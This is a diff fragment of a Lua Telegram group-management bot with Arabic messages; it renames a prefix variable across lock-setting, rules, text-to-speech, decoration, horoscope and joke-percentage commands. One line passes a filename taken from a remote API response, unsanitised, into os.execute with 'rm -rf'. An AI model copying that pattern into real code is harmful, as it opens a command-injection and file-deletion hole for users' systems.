-if DevALI:get(Jenral..'ALI:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
-if DevALI:get(Jenral.."ALI:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
-if DevALI:get(Jenral..'ALI:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
-if DevALI:get(Jenral..'ALI:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
-if DevALI:get(Jenral..'ALI:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
-if DevALI:get(Jenral..'ALI:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
-local Flood_Num = DevALI:hget(Jenral.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
---     Source Jenral     --
+--     Source JENRAL     --
+if DevALI:get(JENRAL..'ALI:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
+if DevALI:get(JENRAL..'ALI:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
+if DevALI:get(JENRAL.."ALI:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
+if DevALI:get(JENRAL..'ALI:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
+if DevALI:get(JENRAL..'ALI:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
+if DevALI:get(JENRAL..'ALI:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
+if DevALI:get(JENRAL..'ALI:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
+local Flood_Num = DevALI:hget(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
+--     Source JENRAL     --
 local TXTE = "⌁︙اعدادات المجموعه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 .."⌁︙الروابط ↫ "..mute_links.."\n"
 .."⌁︙المعرف ↫ "..lock_tag.."\n"
@@ -8541,34 +8529,34 @@ local TXTE = "⌁︙اعدادات المجموعه ↫ ⤈\n┉ ≈ ┉ ≈ ┉
 Dev_ALI(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^كول (.*)$") then
 local txt = {string.match(text, "^(كول) (.*)$")}
 Dev_ALI(msg.chat_id_,0, 1, txt[2], 1, 'md')
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
---     Source Jenral     --
-if DevALI:get(Jenral..'ALI:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
+--     Source JENRAL     --
+if DevALI:get(JENRAL..'ALI:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
 if text == 'الغاء' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
-DevALI:del(Jenral..'ALI:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
 return false  
 end 
-DevALI:del(Jenral..'ALI:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
-DevALI:set(Jenral..'ALI:rules'..msg.chat_id_,text)
+DevALI:del(JENRAL..'ALI:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:set(JENRAL..'ALI:rules'..msg.chat_id_,text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ قوانين المجموعه', 1, 'md')
 return false   
 end
 if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي القوانين الان', 1, 'md')
-DevALI:set(Jenral..'ALI:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
+DevALI:set(JENRAL..'ALI:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
 end
 end
 if text and text:match("^القوانين$") then
-local rules = DevALI:get(Jenral..'ALI:rules'..msg.chat_id_)
+local rules = DevALI:get(JENRAL..'ALI:rules'..msg.chat_id_)
 Dev_ALI(msg.chat_id_, msg.id_, 1, rules, 1, nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'رقمي' and SourceCh(msg) then
 tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
 if result.phone_number_  then
@@ -8579,18 +8567,18 @@ end
 send(msg.chat_id_, msg.id_,MyNumber)
 end,nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "تفعيل انطق" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل ميزة انطق'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Antk:ALI'..msg.chat_id_) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل ميزة انطق'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Antk:ALI'..msg.chat_id_) 
 end
 if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل ميزة انطق'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Antk:ALI'..msg.chat_id_,true)  
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل ميزة انطق'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Antk:ALI'..msg.chat_id_,true)  
 end
-if text and text:match("^انطق (.*)$") and not DevALI:get(Jenral..'ALI:Antk:ALI'..msg.chat_id_) and SourceCh(msg) then
+if text and text:match("^انطق (.*)$") and not DevALI:get(JENRAL..'ALI:Antk:ALI'..msg.chat_id_) and SourceCh(msg) then
 local UrlAntk = https.request('https://apiALI.ml/Antk.php?ALI='..URL.escape(text:match("^انطق (.*)$")))
 Antk = JSON.decode(UrlAntk)
 if UrlAntk.ok ~= false then
@@ -8599,21 +8587,21 @@ sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..Antk.result.translate..'.mp3')
 os.execute('rm -rf ./'..Antk.result.translate..'.mp3') 
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "تفعيل الزخرفه" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الزخرفه بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Zrf:ALI'..msg.chat_id_) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الزخرفه بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Zrf:ALI'..msg.chat_id_) 
 end
 if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الزخرفه بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Zrf:ALI'..msg.chat_id_,true)  
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الزخرفه بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Zrf:ALI'..msg.chat_id_,true)  
 end
-if DevALI:get(Jenral..'Zrf:ALI'..msg.chat_id_..msg.sender_user_id_) then 
+if DevALI:get(JENRAL..'Zrf:ALI'..msg.chat_id_..msg.sender_user_id_) then 
 if text and text == 'الغاء' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر الزخرفه', 1, 'md')
-DevALI:del(Jenral..'Zrf:ALI'..msg.chat_id_..msg.sender_user_id_)
+DevALI:del(JENRAL..'Zrf:ALI'..msg.chat_id_..msg.sender_user_id_)
 return false  
 end 
 UrlZrf = https.request('https://apiALI.ml/zrf.php?ALI='..URL.escape(text)) 
@@ -8625,16 +8613,16 @@ i = i + 1
 t = t..i.."~ `"..v.."` \n"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, t, 1, 'md')
-DevALI:del(Jenral..'Zrf:ALI'..msg.chat_id_..msg.sender_user_id_)
+DevALI:del(JENRAL..'Zrf:ALI'..msg.chat_id_..msg.sender_user_id_)
 return false   
 end
-if not DevALI:get(Jenral..'ALI:Zrf:ALI'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Zrf:ALI'..msg.chat_id_) then
 if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
-DevALI:setex(Jenral.."Zrf:ALI"..msg.chat_id_..msg.sender_user_id_,300,true)
+DevALI:setex(JENRAL.."Zrf:ALI"..msg.chat_id_..msg.sender_user_id_,300,true)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الكلمه لزخرفتها \nيمكنك الزخرفة باللغه { en } ~ { ar } ', 1, 'md')
 end
 end
-if not DevALI:get(Jenral..'ALI:Zrf:ALI'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Zrf:ALI'..msg.chat_id_) then
 if text and text:match("^زخرفه (.*)$") and SourceCh(msg) or text and text:match("^زخرف (.*)$") and SourceCh(msg) then 
 local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
 UrlZrf = https.request('https://apiALI.ml/zrf.php?ALI='..URL.escape(TextZrf)) 
@@ -8648,18 +8636,18 @@ end
 Dev_ALI(msg.chat_id_, msg.id_, 1, t, 1, 'md')
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "تفعيل الابراج" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الابراج بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Brg:ALI'..msg.chat_id_) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الابراج بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Brg:ALI'..msg.chat_id_) 
 end
 if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الابراج بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Brg:ALI'..msg.chat_id_,true)  
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الابراج بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Brg:ALI'..msg.chat_id_,true)  
 end
-if not DevALI:get(Jenral..'ALI:Brg:ALI'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Brg:ALI'..msg.chat_id_) then
 if text and text:match("^برج (.*)$") and SourceCh(msg) or text and text:match("^برجي (.*)$") and SourceCh(msg) then 
 local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
 UrlBrg = https.request('https://apiALI.ml/brg.php?brg='..URL.escape(TextBrg)) 
@@ -8668,114 +8656,114 @@ t = Brg.ok.ALI
 Dev_ALI(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and (text == "تفعيل اوامر النسب" or text == "تفعيل نسبه الحب" or text == "تفعيل نسبه الكره" or text == "تفعيل نسبه الرجوله" or text == "تفعيل نسبه الانوثه" or text == "تفعيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل اوامر النسب'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Nsba:ALI'..msg.chat_id_) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل اوامر النسب'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Nsba:ALI'..msg.chat_id_) 
 end
 if text and (text == "تعطيل اوامر النسب" or text == "تعطيل نسبه الحب" or text == "تعطيل نسبه الكره" or text == "تعطيل نسبه الرجوله" or text == "تعطيل نسبه الانوثه" or text == "تعطيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل اوامر النسب'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Nsba:ALI'..msg.chat_id_,true)  
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل اوامر النسب'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Nsba:ALI'..msg.chat_id_,true)  
 end
-if not DevALI:get(Jenral..'ALI:Nsba:ALI'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Nsba:ALI'..msg.chat_id_) then
 if text == "نسبه الحب" and SourceCh(msg) or text == "نسبة الحب" and SourceCh(msg) then
-DevALI:set(Jenral..'LoveNsba:ALI'..msg.chat_id_..msg.sender_user_id_,true) 
+DevALI:set(JENRAL..'LoveNsba:ALI'..msg.chat_id_..msg.sender_user_id_,true) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك وروز', 1, 'md')
 end
 end
-if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevALI:get(Jenral..'LoveNsba:ALI'..msg.chat_id_..msg.sender_user_id_) then
+if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevALI:get(JENRAL..'LoveNsba:ALI'..msg.chat_id_..msg.sender_user_id_) then
 if text and text == 'الغاء' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الحب ', 1, 'md')
-DevALI:del(Jenral..'LoveNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL..'LoveNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end 
 ALI = math.random(0,100);
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙نسبة الحب بين '..text..' هي : '..ALI..'%', 1, 'md')
-DevALI:del(Jenral..'LoveNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL..'LoveNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
-if not DevALI:get(Jenral..'ALI:Nsba:ALI'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Nsba:ALI'..msg.chat_id_) then
 if text == "نسبه الكره" and SourceCh(msg) or text == "نسبة الكره" and SourceCh(msg) then
-DevALI:set(Jenral..'HataNsba:ALI'..msg.chat_id_..msg.sender_user_id_,true) 
+DevALI:set(JENRAL..'HataNsba:ALI'..msg.chat_id_..msg.sender_user_id_,true) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك وروز', 1, 'md')
 end
 end
-if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and DevALI:get(Jenral..'HataNsba:ALI'..msg.chat_id_..msg.sender_user_id_) then
+if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and DevALI:get(JENRAL..'HataNsba:ALI'..msg.chat_id_..msg.sender_user_id_) then
 if text and text == 'الغاء' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الكره ', 1, 'md')
-DevALI:del(Jenral..'HataNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL..'HataNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end 
 ALI = math.random(0,100);
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙نسبة الكره بين '..text..' هي : '..ALI..'%', 1, 'md')
-DevALI:del(Jenral..'HataNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL..'HataNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
-if not DevALI:get(Jenral..'ALI:Nsba:ALI'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Nsba:ALI'..msg.chat_id_) then
 if text and (text == "نسبه الرجوله" or text == "نسبة الرجوله" or text == "نسبه رجوله" or text == "نسبة رجوله") and SourceCh(msg) then
-DevALI:set(Jenral..'RjolaNsba:ALI'..msg.chat_id_..msg.sender_user_id_,true) 
+DevALI:set(JENRAL..'RjolaNsba:ALI'..msg.chat_id_..msg.sender_user_id_,true) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
 end
 end
-if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and DevALI:get(Jenral..'RjolaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) then
+if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and DevALI:get(JENRAL..'RjolaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) then
 if text and text == 'الغاء' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الرجوله ', 1, 'md')
-DevALI:del(Jenral..'RjolaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL..'RjolaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end 
 ALI = math.random(0,100);
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙نسبة رجولة '..text..' هي : '..ALI..'%', 1, 'md')
-DevALI:del(Jenral..'RjolaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL..'RjolaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
-if not DevALI:get(Jenral..'ALI:Nsba:ALI'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Nsba:ALI'..msg.chat_id_) then
 if text and (text == "نسبه الانوثه" or text == "نسبة الانوثه" or text == "نسبه انوثه" or text == "نسبة انوثه") and SourceCh(msg) then
-DevALI:set(Jenral..'AnothaNsba:ALI'..msg.chat_id_..msg.sender_user_id_,true) 
+DevALI:set(JENRAL..'AnothaNsba:ALI'..msg.chat_id_..msg.sender_user_id_,true) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
 end
 end
-if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and DevALI:get(Jenral..'AnothaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) then
+if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and DevALI:get(JENRAL..'AnothaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) then
 if text and text == 'الغاء' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الانوثه ', 1, 'md')
-DevALI:del(Jenral..'AnothaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL..'AnothaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end 
 ALI = math.random(0,100);
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙نسبة انوثة '..text..' هي : '..ALI..'%', 1, 'md')
-DevALI:del(Jenral..'AnothaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL..'AnothaNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
-if not DevALI:get(Jenral..'ALI:Nsba:ALI'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Nsba:ALI'..msg.chat_id_) then
 if text and (text == "نسبه الغباء" or text == "نسبة الغباء") and SourceCh(msg) then
-DevALI:set(Jenral..'StupidNsba:ALI'..msg.chat_id_..msg.sender_user_id_,true) 
+DevALI:set(JENRAL..'StupidNsba:ALI'..msg.chat_id_..msg.sender_user_id_,true) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
 end
 end
-if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and DevALI:get(Jenral..'StupidNsba:ALI'..msg.chat_id_..msg.sender_user_id_) then
+if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and DevALI:get(JENRAL..'StupidNsba:ALI'..msg.chat_id_..msg.sender_user_id_) then
 if text and text == 'الغاء' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الغباء ', 1, 'md')
-DevALI:del(Jenral..'StupidNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL..'StupidNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end 
 ALI = math.random(0,100);
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙نسبة غباء '..text..' هي : '..ALI..'%', 1, 'md')
-DevALI:del(Jenral..'StupidNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL..'StupidNsba:ALI'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "تفعيل حساب العمر" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل حساب العمر'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Age:ALI'..msg.chat_id_) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل حساب العمر'
